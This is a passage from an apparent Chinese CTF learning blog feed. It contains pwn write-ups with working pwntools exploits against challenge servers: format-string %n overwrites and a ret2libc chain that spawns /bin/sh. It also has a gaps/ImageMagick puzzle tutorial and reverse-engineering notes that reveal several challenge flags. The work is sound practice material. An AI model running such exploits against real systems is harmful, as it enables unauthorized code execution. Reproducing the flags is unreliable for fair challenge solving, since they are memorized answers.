class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs text">&gt;gdb-peda$ c<br>&gt;Continuing.<br>&gt;AAAA.0x1.0x88888888.0xffffffff.0xffffd57a.0xffffd584.0x56555220.0x565555d7.0xf7ffda54.0x1.0x424135d0.0x4443.(nil).0x41414141.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e.0x252e7025.0x70252e70.0x2e70252e<br></code></pre></td></tr></table></figure><p> <code>0x41414141</code> 是输出的第 13 个字符，所以我们使用 <code>%13$s</code> 即可读出 <code>0x41414141</code> 处的内容，当然，这里可能是一个不合法的地址。只要将0x41414141改成有效地址就可以任意地址的访问</p><ol start="4"><li>%$n可以将当前已经写入的字符个数赋值给所给的地址</li></ol></blockquote><p><img src="https://s2.loli.net/2022/04/08/rOqGw3Eit6759Nn.png" alt="屏幕截图 2022-03-30 170255"></p><p>根据前面对于格式化字符串漏洞的学习，我们可以找到pwn的地址，对其进行覆盖，pwnme位于bss区域，地址不会更改，所以我们只要找到printf的偏移量就可以写exp了</p><p>![屏幕截图 2022-03-30 170311](E:\屏幕截图\屏幕截图 2022-03-30 170311.png)</p><p>可以知道偏移量为10</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;111.200.241.244&quot;</span>,<span class="hljs-number">55080</span>)<br>a.sendlineafter(<span class="hljs-string">&quot;please tell me your name:&quot;</span>,<span class="hljs-number">123</span>)<br>payload=p32(<span class="hljs-number">0x0804A068</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.recvuntil(<span class="hljs-string">&quot;leave your message please:&quot;</span>)<br>a.sendline(payload)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="xctf-pwn-hello-pwn"><a href="#xctf-pwn-hello-pwn" class="headerlink" title="xctf pwn hello_pwn"></a>xctf pwn hello_pwn</h1><p><img src="https://s2.loli.net/2022/04/08/zdgE82cBWfQeMku.png" alt="屏幕截图 2022-03-30 171747"></p><p><img src="https://s2.loli.net/2022/04/08/A7Tz5ZsiQI1bqRH.png" alt="屏幕截图 2022-03-30 171810"></p><p><img src="https://s2.loli.net/2022/04/08/T5uvUNApWwHFISn.png" alt="屏幕截图 2022-03-30 171818"></p><p><img src="https://s2.loli.net/2022/03/30/Msaxd9lwcbtTqBm.png" alt="屏幕截图 2022-03-30 171848"></p><h1 id="buuoj-pwn-pwn5"><a href="#buuoj-pwn-pwn5" class="headerlink" title="buuoj pwn pwn5"></a>buuoj pwn pwn5</h1><p>首先先checksec一下程序，发现不可栈溢出和NX。打开ida分析下</p><p><img src="https://s2.loli.net/2022/04/02/WpaekqIwEZV52z3.png" alt="屏幕截图 2022-04-02 154600"></p><p><img src="https://s2.loli.net/2022/04/02/XEz6VNvgWYpACwK.png" alt="屏幕截图 2022-04-02 154619"></p><p>同时判断的关键数据的地址正好位于bss段，地址不会更改。于是可以利用格式化输出的漏洞</p><p><img src="https://s2.loli.net/2022/04/02/uEwVZXh6FgD4PSf.png" alt="屏幕截图 2022-04-02 154744"></p><p>发现偏移量位10，于是可以写exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>a=remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">28470</span>)<br>a.recvuntil(<span class="hljs-string">&quot;your name:&quot;</span>)<br>payload=p32(<span class="hljs-number">0x0804C044</span>)+<span class="hljs-string">b&#x27;aaaa&#x27;</span>+<span class="hljs-string">b&#x27;%10$n&#x27;</span><br>a.sendline(payload)<br>a.recvuntil(<span class="hljs-string">&quot;your passwd:&quot;</span>)<br>a.sendline(<span class="hljs-string">b&#x27;8&#x27;</span>)<br>a.interactive()<br></code></pre></td></tr></table></figure><h1 id="buuoj-pwn-ciscn-2019-n-8"><a href="#buuoj-pwn-ciscn-2019-n-8" class="headerlink" title="buuoj pwn ciscn_2019_n_8"></a>buuoj pwn ciscn_2019_n_8</h1><p>scanf(“%s”)既提供了首地址，然后又没有限制输入的长度，可以利用这个来进行栈覆盖</p><p><img src="https://s2.loli.net/2022/04/03/CSmyes4dUzc1i8k.png" alt="屏幕截图 2022-04-03 144825"></p><p><img src="https://s2.loli.net/2022/04/03/ZzBFN1hXi84IKRC.png" alt="屏幕截图 2022-04-03 144740"></p><h1 id="buuoj-pwn-babyrop"><a href="#buuoj-pwn-babyrop" class="headerlink" title="buuoj pwn babyrop"></a>buuoj pwn babyrop</h1><p>首先打开ida分析下程序运行方式</p><p><img src="https://s2.loli.net/2022/04/03/HZDy21KIEf986LF.png" alt="屏幕截图 2022-04-03 160816"></p><p><img src="https://s2.loli.net/2022/04/03/sp7W5MItrBYvwEj.png" alt="屏幕截图 2022-04-03 160827"></p><p><img src="https://s2.loli.net/2022/04/03/BxicPIzN45TlebU.png" alt="屏幕截图 2022-04-03 160837"></p><p>程序先从文件里读入数据，然后让我们输入字符串，并进行比较，如果一样就可以继续操作，然后就可以利用栈溢出来得到libc,从而解决问题。</p><p><strong>因为我们不知道程序读入的数据是多少，于是我们只能修改我们输入的值，让它对比通过，可以直接将字符串截断，因为是空字符串，于是肯定能比较成功，在payload中”\x00”可以截断字符串，然后再将buf[7]取最大值就行了”\xff”(255)</strong></p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>a= remote(<span class="hljs-string">&quot;node4.buuoj.cn&quot;</span>,<span class="hljs-number">29138</span>)<br>elf = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;libc_32.so.6&quot;</span>)<br>write_plt=elf.plt[<span class="hljs-string">&#x27;write&#x27;</span>]<br>write_got=elf.got[<span class="hljs-string">&#x27;write&#x27;</span>]<br>main_addr=<span class="hljs-number">0x08048825</span><br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xeb</span>+p32(write_plt)+p32(main_addr)+p32(<span class="hljs-number">0</span>)+p32(write_got)<br>a.sendline(payload2)<br>write_addr=u32(a.recv(<span class="hljs-number">4</span>))<br>libcbase=write_addr-libc.sym[<span class="hljs-string">&#x27;write&#x27;</span>]<br>system_addr=libcbase+libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>bin_sh_addr=libcbase+<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br>payload1=<span class="hljs-string">b&#x27;\x00&#x27;</span>+<span class="hljs-string">b&#x27;\xff&#x27;</span>*<span class="hljs-number">7</span> <span class="hljs-comment">#\x00直接截断字符串，于是可以跳过字符串对比 \xff=255这样超过了buf的大小于是可以栈溢出</span><br>a.sendline(payload1)<br>a.recvuntil(<span class="hljs-string">&quot;Correct\n&quot;</span>)<br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0xeb</span>+p32(system_addr)+p32(<span class="hljs-number">1</span>)+p32(bin_sh_addr)<br>a.sendline(payload2)<br>a.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>reverse</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>linux下的gaps安装和使用</title>
    <link href="/2022/01/26/linux%E4%B8%8B%E7%9A%84gaps%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/"/>
    <url>/2022/01/26/linux%E4%B8%8B%E7%9A%84gaps%E5%AE%89%E8%A3%85%E5%92%8C%E4%BD%BF%E7%94%A8/</url>
    
    <content type="html"><![CDATA[<p>今天复盘hwctf的gogogo时需要用到gaps和ImageMagic，于是学习了下如何使用gaps进行拼图，效果图如下：</p><p><strong>原图：</strong></p><p><img src="https://s2.loli.net/2022/01/26/W7s9qPXTUOl8pxa.png" alt="flag"></p><p><strong>效果图：(不知道kali为啥保存下来时会反色）</strong><br><img src="https://s2.loli.net/2022/01/26/NAwJ1LEHga698Ck.jpg" alt="flag_solution"></p><h1 id="gaps安装"><a href="#gaps安装" class="headerlink" title="gaps安装"></a>gaps安装</h1><p>请提前下好pillow,opencv-python,pytest,matplotlib,具体安装步骤如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">pip install pillow/pytest/opencv-python/matplotlib<br></code></pre></td></tr></table></figure><p>然后进行gaps安装</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">$ git clone https://github.com/nemanja-m/gaps.git<br>$ cd gaps<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pip install -r requirements.txt <br>//安装完这步后就打开requirements.txt把上述库的版本填写正确<br>$ sudo apt-get install python-tk<br></code></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">$ pip install -e . <br>// .号不要省略，我已经踩了好几次坑了www<br>//如果不报错就说明安装完成了<br></code></pre></td></tr></table></figure><p>这样gaps就安装完成啦。但是只有gaps是不能完成拼图的。<strong>这里我也踩坑了好几次</strong></p><p>以hwctf gogogo为例，题目给了256个文件，需要进行拼图还原</p><p><img src="https://s2.loli.net/2022/01/26/NjpmRn7wql2AKJz.png" alt="屏幕截图 2022-01-26 175853"></p><p><strong>而gaps只能拼一张大图，不能将256个图片全部合并在一起拼成一张大图。于是就需要使用ImageMagic来将拼图碎片拼成一张大图了！！！</strong></p><h1 id="ImageMagic-安装和使用"><a href="#ImageMagic-安装和使用" class="headerlink" title="ImageMagic 安装和使用"></a>ImageMagic 安装和使用</h1><ol><li><p>首先官网下载<a href="https://imagemagick.org/script/download.php">ImageMagic</a>，记得要把imageMagic加入系统path</p></li><li><p>用cmd到你的拼图文件，敲入以下命令</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">magick</span> montage *.png -tile <span class="hljs-number">10</span>x10 -geometry +<span class="hljs-number">0</span>+<span class="hljs-number">0</span> flag.png<br></code></pre></td></tr></table></figure></li><li><p>推荐打开ps将图片大小改成正方形，这样方便gaps使用时的size计算‘</p></li></ol><h1 id="gaps的使用"><a href="#gaps的使用" class="headerlink" title="gaps的使用"></a>gaps的使用</h1><ol><li><p>首先将刚才imagemagic得到的图片放入~&#x2F;root&#x2F;gaps&#x2F;bin文件加中</p></li><li><p>cd到该bin文件夹，使用以下命令</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python">gaps --image=*.png --generation=<span class="hljs-number">30</span> --population=<span class="hljs-number">300</span> --size=** -save<br>–image 指向拼图的路径<br>–size 拼图块的像素尺寸<br>–generations 遗传算法的代的数量<br>–population 个体数量<br>–verbose 每一代训练结束后展示最佳结果<br>–save 将拼图还原为图像<br></code></pre></td></tr></table></figure></li><li><p>如果要创建拼图可以自己取GitHub仓库上看作者给的教程。</p></li></ol><p>这样gaps拼图功能就实现啦。</p>]]></content>
    
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>逆向做题记录</title>
    <link href="/2022/01/24/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <url>/2022/01/24/%E9%80%86%E5%90%91%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="特殊的base64"><a href="#特殊的base64" class="headerlink" title="特殊的base64"></a>特殊的base64</h1><p>这道题故名思意 ，肯定是base64改变字母表，顺便复习下之前写过的脚本</p><p>首先打开ida先找改变后的字母表，找到后再找到密文就可以得到flag了。</p><p><img src="https://s2.loli.net/2022/01/24/GTwqYPMSnQc4gvp.png" alt="屏幕截图 2022-01-21 151916"><br><img src="https://s2.loli.net/2022/01/24/J9GokZfdKySlB4b.png" alt="屏幕截图 2022-01-21 151830"></p><h1 id="re4-unvm-me"><a href="#re4-unvm-me" class="headerlink" title="re4-unvm-me"></a>re4-unvm-me</h1><p>为什么开始做攻防世界的题了，因为buu后面的题有亿点点难。这道题时py反编译，用在线网站<a href="https://tool.lu/pyc/">python反编译 - 在线工具 (tool.lu)</a>可以快速得到源码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit http://tool.lu/pyc/ for more information</span><br><span class="hljs-keyword">import</span> md5<br>md5s = [<br>    <span class="hljs-number">0x831DAA3C843BA8B087C895F0ED305CE7L</span>,<br>    <span class="hljs-number">0x6722F7A07246C6AF20662B855846C2C8L</span>,<br>    <span class="hljs-number">0x5F04850FEC81A27AB5FC98BEFA4EB40CL</span>,<br>    <span class="hljs-number">0xECF8DCAC7503E63A6A3667C5FB94F610L</span>,<br>    <span class="hljs-number">0xC0FD15AE2C3931BC1E140523AE934722L</span>,<br>    <span class="hljs-number">0x569F606FD6DA5D612F10CFB95C0BDE6DL</span>,<br>    <span class="hljs-number">0x68CB5A1CF54C078BF0E7E89584C1A4EL</span>,<br>    <span class="hljs-number">0xC11E2CD82D1F9FBD7E4D6EE9581FF3BDL</span>,<br>    <span class="hljs-number">0x1DF4C637D625313720F45706A48FF20FL</span>,<br>    <span class="hljs-number">0x3122EF3A001AAECDB8DD9D843C029E06L</span>,<br>    <span class="hljs-number">0xADB778A0F729293E7E0B19B96A4C5A61L</span>,<br>    <span class="hljs-number">0x938C747C6A051B3E163EB802A325148EL</span>,<br>    <span class="hljs-number">0x38543C5E820DD9403B57BEFF6020596DL</span>]<br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Can you turn me back to python ? ...&#x27;</span><br>flag = raw_input(<span class="hljs-string">&#x27;well as you wish.. what is the flag: &#x27;</span>)<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) &gt; <span class="hljs-number">69</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>    exit()<br><span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(flag) % <span class="hljs-number">5</span> != <span class="hljs-number">0</span>:<br>    <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>    exit()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(flag), <span class="hljs-number">5</span>):<br>    s = flag[i:i + <span class="hljs-number">5</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(<span class="hljs-string">&#x27;0x&#x27;</span> + md5.new(s).hexdigest(), <span class="hljs-number">16</span>) != md5s[i / <span class="hljs-number">5</span>]:<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;nice try&#x27;</span><br>        exit()<br>        <span class="hljs-keyword">continue</span><br><span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;Congratz now you have the flag&#x27;</span><br><br></code></pre></td></tr></table></figure><p>flag的长度小于69且是五的倍数，然后flag每五个一组和上面给的MD5进行对比，所以只要把上面的MD5全部拼在一起就可以得到flag</p><p>flag：ALEXCTF{dv5d4s2vj8nk43s8d8l6m1n5l67ds9v41n52nv37j481h3d28n4b6v3k}</p><h1 id="流浪者"><a href="#流浪者" class="headerlink" title="流浪者"></a>流浪者</h1><p><img src="https://s2.loli.net/2022/01/24/Tpo4tU8BXnqSlrx.png" alt="屏幕截图 2022-01-23 142623"></p><p><img src="https://s2.loli.net/2022/01/24/yWDAzLBiJu1nSkN.png" alt="屏幕截图 2022-01-23 142614"></p><p>题目先给出了str1，然后让str1的每个元素和字母表进行对比，反着来可以得到a1(v5),v5(在原函数中也是进行了变化，因此可以将v5逆回去得到flag</p><p><img src="https://s2.loli.net/2022/01/24/be1hB82MXUWRIJL.png" alt="屏幕截图 2022-01-23 142523"></p><p>flag:flag{j0rXI4bTeustBiIGHeCF70DDM}</p><h1 id="actf-universe-final-ans"><a href="#actf-universe-final-ans" class="headerlink" title="actf universe_final_ans"></a>actf universe_final_ans</h1><p>打开ida发现有一个条件函数和一个比较函数，说明程序关键在这两个函数</p><p><img src="https://s2.loli.net/2022/01/24/HRDikdZKmMbJlhj.png" alt="屏幕截图 2022-01-13 165706"></p><p>打开第一个函数发现是方程组，用这库写完后得到前一半flag</p><p><img src="https://s2.loli.net/2022/01/24/iWRNIGDpUMyJ1La.png" alt="屏幕截图 2022-01-13 165807"></p><p><img src="https://s2.loli.net/2022/01/24/VyuTmkqInojKC7B.png" alt="屏幕截图 2022-01-13 165432"></p><p><img src="https://s2.loli.net/2022/01/24/S1pJ7ByM4qiANec.png" alt="屏幕截图 2022-01-13 165442"></p><p>第二个函数我死活分析不出来，卡住了。后来实在没办法就去参考了下题解，发现大家都没分析出来第二个函数，都是采用运行elf文件得到第二个部分。给了我启示，不要死磕在解出函数，如果程序有两个函数，可以尝试下将第一个部分的flag带入，说不定就能得到第二部分flag</p><h1 id="buuctf-刮开有奖"><a href="#buuctf-刮开有奖" class="headerlink" title="buuctf 刮开有奖"></a>buuctf 刮开有奖</h1><p>用ida打开后发现是windows程序，同时看了下字符串，出现了ABCD…..789这类字符串，怀疑有base64加密，只调用了DialogBoxParamA这个api，打开dialogfunc函数后发现了主程序</p><p><img src="https://s2.loli.net/2022/01/24/GrjdxTSAtQHiWmY.png"></p><p>对4010F0函数进行封装后的得到v7变化后的值</p><p><img src="https://s2.loli.net/2022/01/24/hmUTsNQ4bVOxBLE.png" alt="屏幕截图 2022-01-15 151601"></p><p>点开v4v5调用的sub_401000发现调用了BCD….789这个字符串，肯定了用base64加密，base64解密后，将每个字符串对应string下标后得到flag： flag{UJWP1jMp}</p><h1 id="wusctf2020-level1"><a href="#wusctf2020-level1" class="headerlink" title="wusctf2020 level1"></a>wusctf2020 level1</h1><p>用ida打开程序后发现主函数特别简单就是进行了移位和相乘，并且用fclose fopen fprintf将得到的数据存入了flag.txt文件中，只要将flag.txt文件中的数据提取出来，并且进行反移位后就可以得到flag</p><p><img src="https://s2.loli.net/2022/01/24/xQZJlPzakIDAyLO.png" alt="屏幕截图 2022-01-15 154722.png"></p><p><img src="https://s2.loli.net/2022/01/24/r7lXPvSLxIGuFBN.png" alt="屏幕截图 2022-01-15 154732.png"></p><p>flag为flag{d9-dE6-20c}</p><h1 id="MRCTF2020-Transform"><a href="#MRCTF2020-Transform" class="headerlink" title="[MRCTF2020]Transform"></a>[MRCTF2020]Transform</h1><p>首先用ida打开找到主函数后跟进分析</p><p><img src="https://s2.loli.net/2022/01/24/6tVNaeXmZA1R7Fv.png" alt="屏幕截图 2022-01-15 162805"></p><p><strong>这里要注意一点：存储flag的str字符串在进行异或时是str[dword_40f040]所以会先把str打乱</strong></p><p>发现主函数进行了异或操作，于是找到数据</p><p><img src="https://s2.loli.net/2022/01/24/yLONPEca5tU4BhZ.png" alt="屏幕截图 2022-01-15 162818"></p><p>用shift+e提出数据后写脚本得到答案即可</p><p><img src="https://s2.loli.net/2022/01/24/g9UroXl5PDdvRFw.png" alt="屏幕截图 2022-01-15 163413"></p><p>flag为flag{Tr4nsp0sltiON_Clph3r_1s_3z}</p><h1 id="FlareOn4-login"><a href="#FlareOn4-login" class="headerlink" title="FlareOn4 login"></a>FlareOn4 login</h1><p>第一次做java类的题目，挺简单的但还是记录一下，用vscode打开html文件后得到</p><p><img src="https://s2.loli.net/2022/01/24/eOdtAF7XUlYJomL.png" alt="屏幕截图 2022-01-15 163809"></p><p>可知用了rot13加密，解密后就可以得到flag：flag{<a href="mailto:&#67;&#x6c;&#x69;&#101;&#x6e;&#116;&#x53;&#x69;&#x64;&#101;&#76;&#111;&#x67;&#105;&#110;&#115;&#x41;&#114;&#101;&#69;&#97;&#x73;&#121;&#64;&#x66;&#x6c;&#97;&#114;&#101;&#x2d;&#111;&#110;&#x2e;&#x63;&#111;&#109;">&#67;&#x6c;&#x69;&#101;&#x6e;&#116;&#x53;&#x69;&#x64;&#101;&#76;&#111;&#x67;&#105;&#110;&#115;&#x41;&#114;&#101;&#69;&#97;&#x73;&#121;&#64;&#x66;&#x6c;&#97;&#114;&#101;&#x2d;&#111;&#110;&#x2e;&#x63;&#111;&#109;</a>}</p><h1 id="FlareOn6-OverLong"><a href="#FlareOn6-OverLong" class="headerlink" title="FlareOn6 OverLong"></a>FlareOn6 OverLong</h1><p>首先看了下题目名字overlong和hint:</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">The secret <span class="hljs-keyword">of</span> this next challenge is cleverly hidden. However, <span class="hljs-keyword">with</span> <span class="hljs-keyword">the</span> <span class="hljs-literal">right</span> approach, finding <span class="hljs-keyword">the</span> solution will <span class="hljs-keyword">not</span> take <span class="hljs-keyword">an</span> &lt;b&gt;overlong&lt;/b&gt; amount <span class="hljs-keyword">of</span> <span class="hljs-built_in">time</span>.<br></code></pre></td></tr></table></figure><p>我猜测真正的数据应该是被隐藏了。</p><p>先用IDA打开程序，发现程序除了一个MessageBox api什么都没有</p><p><img src="https://s2.loli.net/2022/01/24/glzxpuGfbeIKPnZ.png" alt="屏幕截图 2022-01-16 100728"></p><p>于是逐个分析函数</p><p><img src="https://s2.loli.net/2022/01/24/4f6sLKrIpQZNedB.png" alt="屏幕截图 2022-01-16 101626"><br><img src="https://s2.loli.net/2022/01/24/LERdtTm2ABzIlP5.png" alt="屏幕截图 2022-01-16 101638"></p><p>发程序在401160函数执行了28次，同时402008处的数据给出了，但特别多超过了28个</p><p><img src="https://s2.loli.net/2022/01/24/siUNQ1bmMeEVRr2.png" alt="屏幕截图 2022-01-16 101717"></p><p>于是我开始分析，但没分析出来QAQ，看了题解后得知要使用动态调试。于是又开始跟着题解用OD开始解题，</p><p>先是F9运行了下程序，发现窗口出现的英文字母的总和正好是0x1c，于是开始寻找含有0x1c的指令，并将其数值改大，就可以出现flag:flag{<a href="mailto:&#x49;&#95;&#x61;&#x5f;&#77;&#x5f;&#116;&#95;&#x68;&#95;&#101;&#x5f;&#x65;&#x5f;&#110;&#95;&#67;&#x5f;&#111;&#95;&#x44;&#95;&#x69;&#95;&#x6e;&#x5f;&#x67;&#x40;&#102;&#108;&#x61;&#x72;&#101;&#x5f;&#x6f;&#x6e;&#x2e;&#x63;&#111;&#109;">&#x49;&#95;&#x61;&#x5f;&#77;&#x5f;&#116;&#95;&#x68;&#95;&#101;&#x5f;&#x65;&#x5f;&#110;&#95;&#67;&#x5f;&#111;&#95;&#x44;&#95;&#x69;&#95;&#x6e;&#x5f;&#x67;&#x40;&#102;&#108;&#x61;&#x72;&#101;&#x5f;&#x6f;&#x6e;&#x2e;&#x63;&#111;&#109;</a>}</p><p>动态调试我刚刚接触，做的比较少，我对于使用题目要使用动态调试的情况的理解：第一个就是程序基本没有字符串或者没有给出明显的提示；二是程序本身比较复杂或者给出的数值很大很多，需要一个一个的动态给出。</p><p>这是我目前的理解，以后可能做多了会有更多的理解。</p><h1 id="MRCTF2020-hello-world-go"><a href="#MRCTF2020-hello-world-go" class="headerlink" title="[MRCTF2020]hello_world_go"></a>[MRCTF2020]hello_world_go</h1><p><img src="https://s2.loli.net/2022/01/24/134v5pJlgBWCkiw.png" alt="屏幕截图 2022-01-09 114941"></p><p>观看反编译找到关键函数cmpstring，得知flag肯定和这个比较函数有关，跟进后就发现了flag:flag{hello_world_gogogo};</p><h1 id="WUSTCTF2020-level3"><a href="#WUSTCTF2020-level3" class="headerlink" title="[WUSTCTF2020]level3"></a>[WUSTCTF2020]level3</h1><p><img src="https://s2.loli.net/2022/01/16/EqZoXHWplwLSd6Q.png" alt="屏幕截图 2022-01-09 130825"></p><p>看题目给出的提示发现这道题要用到base64加密，但又和普通的base64加密有所不同。于是继续查找函数。</p><p>找到这个可疑的函数，后发现了base64字母表的变换规律：</p><p><img src="https://s2.loli.net/2022/01/24/ZubzFDVhTyqBck5.png" alt="屏幕截图 2022-01-09 130833"></p><p><img src="https://s2.loli.net/2022/01/16/12krvMD7SpbAKEm.png" alt="屏幕截图 2022-01-09 115825"></p><p>但是因为不会写变异后的base64解密脚本，于是查看了题解，按着题解的脚本写了一遍后得到了flag：</p><p><img src="https://s2.loli.net/2022/01/16/gd4V5e6DUMf9a7s.png" alt="屏幕截图 2022-01-09 115900"></p><p>flag{Base64_is_the_start_of_reverse}</p><h1 id="WUSTCTF2020-Cr0ssfun"><a href="#WUSTCTF2020-Cr0ssfun" class="headerlink" title="[WUSTCTF2020]Cr0ssfun"></a>[WUSTCTF2020]Cr0ssfun</h1><p>这题比较常规，反编译后发现了主函数中的关键函数check()，点进去后发现他给出了a1数组的每个下标的字母，将每个字母提取出来后，输出就可以得到flag:</p><p><img src="https://s2.loli.net/2022/01/16/nPQ5dLbgZU9yXmA.png" alt="屏幕截图 2022-01-09 130041"></p><p><img src="https://s2.loli.net/2022/01/16/D5TXUHAFtYiLE3S.png" alt="屏幕截图 2022-01-09 130050"></p><p><img src="https://s2.loli.net/2022/01/16/CK1QB9LPd4oJjMN.png" alt="屏幕截图 2022-01-09 130059"></p><p><img src="https://s2.loli.net/2022/01/16/zWkb73oe9Jtdapx.png" alt="屏幕截图 2022-01-09 130106"></p><p><img src="https://s2.loli.net/2022/01/16/L3l2eT58sbNMAyd.png" alt="屏幕截图 2022-01-09 130113"></p><p>![屏幕截图 2022-01-09 130027](C:\Users\HXDCHLL\Pictures\屏幕截图 2022-01-09 130027.png)</p><p>得到flag:  wctf2020{cpp@nd_r3verse_@re_fu}<br>修改为 flag{cpp@nd_r3verse_@re_fu} </p><h1 id="FlareOn3-Challenge1"><a href="#FlareOn3-Challenge1" class="headerlink" title="[FlareOn3]Challenge1"></a>[FlareOn3]Challenge1</h1><p><img src="https://s2.loli.net/2022/01/16/Gxjb3mAaQi9vTZ4.png" alt="屏幕截图 2022-01-09 131624"></p><p><img src="https://s2.loli.net/2022/01/16/fRhoqI7iyT3pPum.png" alt="屏幕截图 2022-01-09 131700"></p><p><img src="https://s2.loli.net/2022/01/16/7DPbYnIXF3zq4N8.png" alt="20210203123555487"></p><p><img src="https://s2.loli.net/2022/01/16/hlFsgCfJOPNzrHV.png" alt="20210203123510173"></p><p>我一个一个改str1后再base64得到了flag</p><p> flag{<a 